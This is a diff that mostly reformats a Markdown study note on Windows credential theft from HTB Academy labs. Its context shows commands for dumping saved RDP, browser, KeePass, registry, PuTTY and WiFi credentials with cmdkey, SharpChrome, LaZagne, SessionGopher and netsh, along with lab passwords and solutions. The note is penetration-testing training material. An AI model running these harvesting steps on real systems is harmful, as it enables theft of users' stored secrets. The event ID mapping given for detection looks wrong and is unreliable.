@@ -1,4 +1,4 @@
-# Further Credential Theft
+# 🕵️ Further Credential Theft
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 💾 Cmdkey Saved Credentials
 
 ### Listing Stored Credentials
+
 ```cmd
 # List saved credentials for Terminal Services/RDP
 cmdkey /list
@@ -18,6 +19,7 @@ User: inlanefreight\bob
 ```
 
 ### Exploiting Saved Credentials
+
 ```cmd
 # Use saved credentials with runas
 runas /savecred /user:inlanefreight\bob "COMMAND HERE"
@@ -29,6 +31,7 @@ runas /savecred /user:inlanefreight\bob "COMMAND HERE"
 ## 🌐 Browser Credentials
 
 ### Chrome Credential Extraction
+
 ```powershell
 # Use SharpChrome to extract saved passwords
 .\SharpChrome.exe logins /unprotect
@@ -42,6 +45,7 @@ password: Welcome1
 ```
 
 ### Detection Considerations
+
 ```cmd
 # Browser credential extraction generates events:
 - Event ID 4983: Process creation
@@ -52,6 +56,7 @@ password: Welcome1
 ## 🔐 Password Managers
 
 ### KeePass Database Cracking
+
 ```bash
 # Extract hash from .kdbx file
 python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
@@ -67,6 +72,7 @@ $keepass$*2*60000*222*...:panther1
 ```
 
 ### Password Manager Targeting
+
 ```cmd
 # Common password manager files:
 *.kdbx          # KeePass databases
@@ -78,6 +84,7 @@ $keepass$*2*60000*222*...:panther1
 ## 📧 Email Credential Mining
 
 ### MailSniper for Exchange
+
 ```powershell
 # Search Exchange mailboxes for credentials
 # Target terms: "pass", "creds", "credentials", "password"
@@ -87,6 +94,7 @@ $keepass$*2*60000*222*...:panther1
 ## 🛠️ LaZagne - Automated Extraction
 
 ### Comprehensive Credential Harvesting
+
 ```cmd
 # Run all LaZagne modules
 .\lazagne.exe all
@@ -109,6 +117,7 @@ Password: ! Q A Z z a q 1
 ```
 
 ### LaZagne Module Categories
+
 ```cmd
 # Available modules:
 chats          # Chat applications
@@ -124,6 +133,7 @@ memory         # Memory dumps
 ## 🔧 SessionGopher
 
 ### Remote Access Tool Credentials
+
 ```powershell
 # Extract PuTTY, WinSCP, FileZilla, RDP credentials
 Import-Module .\SessionGopher.ps1
@@ -150,6 +160,7 @@ Port          : 22
 ## 🗝️ Registry Credential Storage
 
 ### Windows AutoLogon
+
 ```cmd
 # Check AutoLogon configuration
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
@@ -166,6 +177,7 @@ DefaultPassword   REG_SZ    HTB_@cademy_stdnt!
 ```
 
 ### PuTTY Proxy Credentials
+
 ```cmd
 # Enumerate PuTTY sessions
 reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
@@ -187,6 +199,7 @@ ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!
 ## 📡 WiFi Password Extraction
 
 ### Wireless Profile Enumeration
+
 ```cmd
 # List saved wireless networks
 netsh wlan show profile
@@ -200,6 +213,7 @@ User profiles
 ```
 
 ### Wireless Password Retrieval
+
 ```cmd
 # Extract WiFi password
 netsh wlan show profile ilfreight_corp key=clear
@@ -216,10 +230,12 @@ Security settings
 ## 🎯 HTB Academy Lab Solutions
 
 ### Lab Environment Overview
-- **Various RDP credentials**: `jordan:HTB_@cademy_j0rdan!`, `htb-student:HTB_@cademy_stdnt!`
-- **Multiple objectives**: SQL sa password, RDP credentials, vCenter password, FTP password
+
+* **Various RDP credentials**: `jordan:HTB_@cademy_j0rdan!`, `htb-student:HTB_@cademy_stdnt!`
+* **Multiple objectives**: SQL sa password, RDP credentials, vCenter password, FTP password
 
 ### Lab 1: SQL sa Password (as jordan)
+
 ```cmd
 # Objective: Retrieve sa password for SQL01.inlanefreight.local
 # Methods: LaZagne, SessionGopher, registry search, browser credentials
@@ -227,6 +243,7 @@ Security settings
 ```
 
 ### Lab 2: RDP User Discovery (as htb-student)
+
 ```cmd
 # Objective: Find user with stored RDP credentials for WEB01
 # Method: cmdkey /list, SessionGopher, registry enumeration
@@ -235,6 +252,7 @@ cmdkey /list
 ```
 
 ### Lab 3: vCenter Password (as htb-student)
+
 ```cmd
 # Objective: Find password for https://vc01.inlanefreight.local/ui/login
 # Method: SharpChrome browser credential extraction
@@ -243,6 +261,7 @@ cmdkey /list
 ```
 
 ### Lab 4: FTP Password (as htb-student)
+
 ```cmd
 # Objective: Find password for ftp.ilfreight.local
 # Methods: LaZagne all modules, SessionGopher, browser extraction
@@ -253,6 +272,7 @@ cmdkey /list
 ## 🔄 Advanced Techniques
 
 ### Comprehensive Enumeration Strategy
+
 ```powershell
 # 1. Automated extraction
 .\lazagne.exe all
@@ -275,6 +295,7 @@ netsh wlan show profile
 ```
 
 ### Manual Registry Hunting
+
 ```cmd
 # Additional registry locations:
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
@@ -286,6 +307,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\Current001\Services\SNMP
 ## ⚠️ Detection & Defense
 
 ### Detection Indicators
+
 ```cmd
 # Monitor for:
 - Browser database access patterns
@@ -297,6 +319,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\Current001\Services\SNMP
 ```
 
 ### Defensive Measures
+
 ```cmd
 # Security practices:
 - Disable AutoLogon or use encrypted storage
@@ -316,6 +339,6 @@ HKEY_LOCAL_MACHINE\SYSTEM\Current001\Services\SNMP
 5. **Automated tools** like LaZagne provide comprehensive extraction
 6. **WiFi passwords** can enable lateral network access
 
----
+***
 
-*Further credential theft techniques exploit various Windows credential storage mechanisms, providing multiple vectors for privilege escalation and lateral movement.* 
+_Further credential theft techniques exploit various Windows credential storage mechanisms, providing multiple vectors for privilege escalation and lateral movement._
